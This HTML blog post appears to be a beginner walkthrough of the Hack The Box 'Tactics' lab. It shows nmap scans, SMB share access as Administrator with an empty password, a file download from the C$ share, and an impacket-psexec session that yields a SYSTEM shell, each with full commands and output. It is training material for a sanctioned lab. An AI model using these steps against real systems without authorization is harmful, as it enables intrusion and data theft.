<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Tactics - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,tactics,tier-1,vip-tier,network,protocols,smb,reconnaissance,misconfiguration"><meta name=description content="The aim of this walkthrough is to provide help with the Tactics machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/tactics/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/favicon.png><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/favicon-32x32.png><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/apple-touch-icon.png><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Tactics - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Tactics machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/tactics/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-10T21:00:00+00:00"><meta property="article:modified_time" content="2023-05-10T21:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Tactics - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Tactics machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Tactics - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/tactics/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Tactics - Walkthrough","name":"HTB - Tactics - Walkthrough","description":"The aim of this walkthrough is to provide help with the Tactics machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","tactics","tier-1","vip-tier","network","protocols","smb","reconnaissance","misconfiguration"],"articleBody":"The aim of this walkthrough is to provide help with the Tactics machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 1 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAlso, not required, but it is possible to set an environmental variable containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?\nWe start out with a quick connection test.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ ping $rhost -c 4 PING 10.129.118.218 (10.129.118.218) 56(84) bytes of data. 64 bytes from 10.129.118.218: icmp_seq=1 ttl=127 time=10.8 ms 64 bytes from 10.129.118.218: icmp_seq=2 ttl=127 time=10.4 ms 64 bytes from 10.129.118.218: icmp_seq=3 ttl=127 time=10.8 ms 64 bytes from 10.129.118.218: icmp_seq=4 ttl=127 time=10.6 ms --- 10.129.118.218 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 10.392/10.645/10.836/0.174 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ Running nmap without any options does not work, but it does in fact gives us a hint.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ nmap $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 22:18 BST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.07 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ So let’s try it.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ nmap -Pn $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 22:21 BST Nmap scan report for 10.129.118.218 Host is up (0.013s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ Three (top) ports appear to be open: 135, 139 and 445.\nLet’s check these reported services for some more information.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ nmap -p135,139,445 -Pn -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-10 22:38 BST Nmap scan report for 10.129.118.218 Host is up (0.012s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-05-10T21:38:14 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.52 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ -Pn\nTASK 2 Question: What does the 3-letter acronym SMB stand for?\nA quick online search can do wonders…\nserver message block\nTASK 3 Question: What port does SMB use to operate at?\nOnline research, just like in the previous task.\n445\nTASK 4 Question: What command line argument do you give to `smbclient` to list available shares?\nUsing the command’s built-in help option should gives us a hand here.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ smbclient --help Usage: smbclient [OPTIONS] service ... -L, --list=HOST Get a list of shares available on a host ... Trying out the default Administrator account and hoping that it is misconfigured (without any password) does not disappoint.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ smbclient -L $rhost -U Administrator Password for [WORKGROUP\\Administrator]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC SMB1 disabled -- no workgroup available ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ Three shares are listed on our target machine.\n-L\nTASK 5 Question: What character at the end of a share name indicates it's an administrative share?\nLooking at the reported shares from TASK4, it must be $. But let’s try and access the shares:\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ smbclient //$rhost/ADMIN$ -U Administrator Password for [WORKGROUP\\Administrator]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Mon Sep 20 17:02:48 2021 .. D 0 Mon Sep 20 17:02:48 2021 $Reconfig$ D 0 Mon Sep 20 17:02:49 2021 ADFS D 0 Sat Sep 15 08:19:03 2018 appcompat D 0 Sat Sep 15 08:19:00 2018 apppatch D 0 Mon Oct 29 22:39:47 2018 AppReadiness D 0 Wed Apr 21 16:39:36 2021 assembly DR 0 Sat Sep 15 10:09:13 2018 bcastdvr D 0 Sat Sep 15 08:19:00 2018 bfsvc.exe A 78848 Sat Sep 15 08:12:58 2018 Boot D 0 Sat Sep 15 08:19:01 2018 bootstat.dat AS 67584 Wed May 10 22:15:58 2023 Branding D 0 Sat Sep 15 08:19:01 2018 CbsTemp D 0 Wed Jul 7 19:00:03 2021 Containers D 0 Sat Sep 15 08:19:01 2018 Cursors D 0 Sat Sep 15 08:19:04 2018 debug D 0 Wed Apr 21 16:17:15 2021 diagnostics D 0 Sat Sep 15 08:19:01 2018 DigitalLocker D 0 Sat Sep 15 10:05:40 2018 Downloaded Program Files DS 0 Sat Sep 15 08:19:04 2018 drivers D 0 Sat Sep 15 08:19:01 2018 DtcInstall.log A 1947 Wed Apr 21 16:16:44 2021 ELAMBKUP DH 0 Sat Sep 15 08:19:04 2018 en-US D 0 Sat Sep 15 10:05:40 2018 explorer.exe A 4245280 Mon Oct 29 22:39:24 2018 Fonts DSR 0 Sat Sep 15 08:19:04 2018 Globalization D 0 Sat Sep 15 08:19:01 2018 Help D 0 Sat Sep 15 10:05:40 2018 HelpPane.exe A 1065472 Sat Sep 15 08:12:46 2018 hh.exe A 18432 Sat Sep 15 08:12:48 2018 IdentityCRL D 0 Sat Sep 15 08:19:04 2018 IME D 0 Sat Sep 15 10:05:40 2018 ImmersiveControlPanel DR 0 Wed Apr 21 16:16:42 2021 INF D 0 Wed May 10 22:09:44 2023 InputMethod D 0 Sat Sep 15 08:19:01 2018 Installer DHS 0 Wed Jul 7 19:05:00 2021 L2Schemas D 0 Sat Sep 15 08:19:04 2018 LiveKernelReports D 0 Sat Sep 15 08:19:01 2018 Logs D 0 Tue Sep 21 17:33:25 2021 lsasetup.log A 1380 Wed Apr 21 16:16:02 2021 media DSR 0 Sat Sep 15 08:19:04 2018 mib.bin A 43131 Sat Sep 15 08:12:40 2018 Microsoft.NET DR 0 Wed May 10 22:15:59 2023 Migration D 0 Sat Sep 15 08:19:01 2018 ModemLogs D 0 Sat Sep 15 08:19:01 2018 notepad.exe A 254464 Sat Sep 15 08:12:38 2018 OCR D 0 Sat Sep 15 10:07:04 2018 Offline Web Pages DR 0 Sat Sep 15 08:19:05 2018 Panther D 0 Wed Apr 21 16:16:50 2021 Performance D 0 Sat Sep 15 08:19:01 2018 PFRO.log A 1708 Mon Sep 27 11:26:45 2021 PLA D 0 Sat Sep 15 08:19:01 2018 PolicyDefinitions D 0 Sat Sep 15 10:08:05 2018 Prefetch Dn 0 Wed Apr 21 16:16:20 2021 PrintDialog DR 0 Wed Apr 21 16:16:43 2021 Provisioning D 0 Sat Sep 15 08:19:01 2018 regedit.exe A 358400 Sat Sep 15 08:12:52 2018 Registration D 0 Wed May 10 22:05:37 2023 RemotePackages D 0 Sat Sep 15 08:19:01 2018 rescache D 0 Sat Sep 15 08:19:01 2018 Resources D 0 Sat Sep 15 08:19:01 2018 SchCache D 0 Sat Sep 15 08:19:01 2018 schemas D 0 Sat Sep 15 08:19:01 2018 security D 0 Sat Sep 15 08:19:01 2018 ServerStandard.xml A 30931 Sat Sep 15 08:13:27 2018 ServiceProfiles D 0 Wed Apr 21 16:16:04 2021 ServiceState D 0 Sat Sep 15 08:19:01 2018 servicing D 0 Sat Sep 15 10:06:36 2018 Setup D 0 Sat Sep 15 08:21:38 2018 ShellComponents D 0 Sat Sep 15 08:19:05 2018 ShellExperiences D 0 Sat Sep 15 08:19:05 2018 SKB D 0 Sat Sep 15 08:19:01 2018 SoftwareDistribution D 0 Wed Apr 21 16:23:54 2021 Speech D 0 Sat Sep 15 08:19:01 2018 Speech_OneCore D 0 Sat Sep 15 08:19:01 2018 splwow64.exe A 132096 Sat Sep 15 08:13:30 2018 System D 0 Sat Sep 15 08:19:01 2018 system.ini A 219 Sat Sep 15 08:16:48 2018 System32 D 0 Wed May 10 22:09:44 2023 SystemApps D 0 Sat Sep 15 08:19:01 2018 SystemResources D 0 Sat Sep 15 08:19:01 2018 SysWOW64 D 0 Wed Jul 7 19:04:43 2021 TAPI D 0 Tue Sep 21 17:51:49 2021 Tasks D 0 Wed Apr 21 16:16:18 2021 Temp D 0 Wed May 10 22:16:17 2023 TextInput D 0 Sat Sep 15 08:19:14 2018 tracing D 0 Sat Sep 15 08:19:01 2018 twain_32 D 0 Sat Sep 15 08:19:14 2018 twain_32.dll A 64512 Sat Sep 15 08:13:11 2018 Vss D 0 Sat Sep 15 08:19:01 2018 WaaS D 0 Sat Sep 15 08:19:01 2018 Web D 0 Sat Sep 15 08:19:01 2018 win.ini A 92 Sat Sep 15 08:16:48 2018 WindowsShell.Manifest AHR 670 Sat Sep 15 08:12:40 2018 WindowsUpdate.log A 276 Wed May 10 22:05:41 2023 winhlp32.exe A 11776 Sat Sep 15 08:13:11 2018 WinSxS D 0 Wed Jul 7 18:46:29 2021 WMSysPr9.prx A 316640 Sat Sep 15 08:12:02 2018 write.exe A 11264 Sat Sep 15 08:12:55 2018 3774463 blocks of size 4096. 1156502 blocks available smb: \\\u003e pwd Current directory is \\\\10.129.118.218\\ADMIN$\\ smb: \\\u003e exit ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ It looks like the ADMIN$ share contains the Windows system files. How about the other two?\nWe get lucky once we look around the C$ share. We find the final flag, located at - \\\\$rhost\\C$\\Users\\Administrator\\Desktop\\flag.txt -, so we download it to our local machine.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ smbclient //$rhost/C$ -U Administrator Password for [WORKGROUP\\Administrator]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls $Recycle.Bin DHS 0 Wed Apr 21 16:23:49 2021 Config.Msi DHS 0 Wed Jul 7 19:04:56 2021 Documents and Settings DHSrn 0 Wed Apr 21 16:17:12 2021 pagefile.sys AHS 738197504 Wed May 10 22:05:32 2023 PerfLogs D 0 Sat Sep 15 08:19:00 2018 Program Files DR 0 Wed Jul 7 19:04:24 2021 Program Files (x86) D 0 Wed Jul 7 19:03:38 2021 ProgramData DH 0 Tue Sep 13 17:27:53 2022 Recovery DHSn 0 Wed Apr 21 16:17:15 2021 System Volume Information DHS 0 Wed Apr 21 16:34:04 2021 Users DR 0 Wed Apr 21 16:23:18 2021 Windows D 0 Wed Jul 7 19:05:23 2021 3774463 blocks of size 4096. 1156502 blocks available smb: \\\u003e cd Users smb: \\Users\\\u003e ls . DR 0 Wed Apr 21 16:23:18 2021 .. DR 0 Wed Apr 21 16:23:18 2021 Administrator D 0 Wed Apr 21 16:23:32 2021 All Users DHSrn 0 Sat Sep 15 08:28:48 2018 Default DHR 0 Wed Apr 21 16:17:12 2021 Default User DHSrn 0 Sat Sep 15 08:28:48 2018 desktop.ini AHS 174 Sat Sep 15 08:16:48 2018 Public DR 0 Wed Apr 21 16:23:31 2021 3774463 blocks of size 4096. 1156502 blocks available smb: \\Users\\\u003e cd Administrator smb: \\Users\\Administrator\\\u003e ls . D 0 Wed Apr 21 16:23:32 2021 .. D 0 Wed Apr 21 16:23:32 2021 3D Objects DR 0 Wed Apr 21 16:23:31 2021 AppData DH 0 Wed Apr 21 16:23:19 2021 Application Data DHSrn 0 Wed Apr 21 16:23:19 2021 Contacts DR 0 Wed Apr 21 16:23:31 2021 Cookies DHSrn 0 Wed Apr 21 16:23:19 2021 Desktop DR 0 Thu Apr 22 08:16:03 2021 Documents DR 0 Wed Apr 21 16:23:32 2021 Downloads DR 0 Wed Jul 7 18:44:36 2021 Favorites DR 0 Wed Apr 21 16:23:31 2021 Links DR 0 Wed Apr 21 16:23:32 2021 Local Settings DHSrn 0 Wed Apr 21 16:23:19 2021 Music DR 0 Wed Apr 21 16:23:32 2021 My Documents DHSrn 0 Wed Apr 21 16:23:19 2021 NetHood DHSrn 0 Wed Apr 21 16:23:19 2021 NTUSER.DAT AHn 786432 Tue Sep 13 17:29:05 2022 ntuser.dat.LOG1 AHS 65536 Wed Apr 21 16:23:18 2021 ntuser.dat.LOG2 AHS 238592 Wed Apr 21 16:23:18 2021 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf AHS 65536 Wed Apr 21 10:03:39 2021 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms AHS 524288 Wed Apr 21 16:23:19 2021 NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms AHS 524288 Wed Apr 21 16:23:19 2021 ntuser.ini HS 20 Wed Apr 21 16:23:19 2021 Pictures DR 0 Wed Apr 21 16:23:31 2021 PrintHood DHSrn 0 Wed Apr 21 16:23:19 2021 Recent DHSrn 0 Wed Apr 21 16:23:19 2021 Saved Games DR 0 Wed Apr 21 16:23:32 2021 Searches DR 0 Wed Apr 21 16:23:32 2021 SendTo DHSrn 0 Wed Apr 21 16:23:19 2021 Start Menu DHSrn 0 Wed Apr 21 16:23:19 2021 Templates DHSrn 0 Wed Apr 21 16:23:19 2021 Videos DR 0 Wed Apr 21 16:23:31 2021 3774463 blocks of size 4096. 1156502 blocks available smb: \\Users\\Administrator\\\u003e cd Desktop smb: \\Users\\Administrator\\Desktop\\\u003e ls . DR 0 Thu Apr 22 08:16:03 2021 .. DR 0 Thu Apr 22 08:16:03 2021 desktop.ini AHS 282 Wed Apr 21 16:23:32 2021 flag.txt A 32 Fri Apr 23 10:39:00 2021 3774463 blocks of size 4096. 1156502 blocks available smb: \\Users\\Administrator\\Desktop\\\u003e pwd Current directory is \\\\10.129.118.218\\C$\\Users\\Administrator\\Desktop\\ smb: \\Users\\Administrator\\Desktop\\\u003e get flag.txt getting file \\Users\\Administrator\\Desktop\\flag.txt of size 32 as flag.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec) smb: \\Users\\Administrator\\Desktop\\\u003e exit ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ $\nTASK 6 Question: Which Administrative share is accessible on the box that allows users to view the whole file system?\nThe answer should be quite simple since we used the same exact share in TASK5 to download our flag file.\nC$\nTASK 7 Question: What command can we use to download the files we find on the SMB Share?\nAgain, we used the same command to download the flag file in TASK5.\nget\nTASK 8 Question: Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?\nOptionally, we could use impacket's psecec tool to spawn a shell in the ADMIN$ share. Then accessing the flag after we located it becomes quite simple.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ impacket-psexec administrator@$rhost Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra Password: [*] Requesting shares on 10.129.118.218..... [*] Found writable share ADMIN$ [*] Uploading file qbvrkWIQ.exe [*] Opening SVCManager on 10.129.118.218..... [*] Creating service UNVK on 10.129.118.218..... [*] Starting service UNVK..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami nt authority\\system C:\\Windows\\system32\u003ecd .. C:\\Windows\u003ecd \\Users\\ C:\\Users\u003ecd Administrator C:\\Users\\Administrator\u003ecd Desktop C:\\Users\\Administrator\\Desktop\u003edir Volume in drive C has no label. Volume Serial Number is EEE0-FCDB Directory of C:\\Users\\Administrator\\Desktop 04/22/2021 12:16 AM . 04/22/2021 12:16 AM .. 04/23/2021 02:39 AM 32 flag.txt 1 File(s) 32 bytes 2 Dir(s) 4,736,704,512 bytes free C:\\Users\\Administrator\\Desktop\u003etype flag.txt C:\\Users\\Administrator\\Desktop\u003e psexec.py\nSUBMIT FLAG Question: Submit root flag\nSimply grabbing the downloaded flag file from TASK5 should do it.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ cat flag.txt ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.46]─[htb-bluewalle@htb-luovj0ahiq]─[~] └──╼ [★]$ Optionally, we could use impacket's psecec tool as we did in TASK8.\nflag\nCongratulations, we just successfully pwned the target machine. All we have left to do now is to terminate the target box (if not terminated automatically) before we continue with the next box!\n","wordCount":"2474","inLanguage":"en","datePublished":"2023-05-10T21:00:00Z","dateModified":"2023-05-10T21:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_1/tactics/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Tactics - Walkthrough</h1><div class=post-meta><span title='2023-05-10 21:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2474 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#task-8><strong>TASK 8</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Tactics</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 1</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Also, not required, but it is possible to set an <strong>environmental</strong> variable containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
